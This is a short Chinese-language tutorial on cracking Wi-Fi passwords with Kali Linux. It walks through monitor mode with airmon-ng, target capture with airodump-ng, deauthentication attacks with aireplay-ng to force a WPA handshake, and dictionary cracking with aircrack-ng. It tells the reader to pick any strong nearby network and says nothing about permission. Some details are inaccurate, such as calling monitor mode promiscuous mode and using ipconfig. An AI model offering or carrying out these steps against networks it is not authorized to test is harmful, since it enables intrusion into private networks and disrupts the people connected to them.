# 使用kali暴力破解wifi

## 准备工作

-   电脑 vmware虚拟机 kalilinux安装包 外置无线网卡
-   步骤
    1.  电脑BIOS中开启虚拟化
    2.  安装VMware虚拟机
    3.  安装Kali linux系统
    4.  将无线网卡挂载到虚拟机中并将网络设置为桥接模式

## 开始破解

1.  查看电脑中IP已经网卡信息

    >   ipconfig		# 用于查看IP信息 应该会有外置网卡

2.  打开网卡混杂模式

    >   airmon-ng start wlan0		#其中wlan0是我外置网卡对应的编号 自行修改

3.  杀掉一些进程

    >   airmon-ng check kill

4.  再次进行混杂(执行步骤2 混杂为wlan0mon)

5.  使用步骤1代码再次进行查看 发现已经有wlan0mon

6.  进行扫描周围的wifi 选择信号较强的一个即可

    >   airodump-ng wlan0mon

7.  进行监听

    >   airodump-ng -c xx --bssid xx:xx:xx:xx:xx:xx -w xxxx wlan0mon
    >
    >   -c 代表信道 --bssid表示MAC地址 -w表示要保存的文件名 最后是端口

8.  进行握手包抓取 (新建一个terminal) 成功会在原窗口出现handshake包

    >   sudo aireplay-ng -0 20 -c 目标机station -a 目标MAC地址 wlan0mon

9.  跑包 使用kali自带的字典

    >   aircrack-ng -w 字典名 包名










 



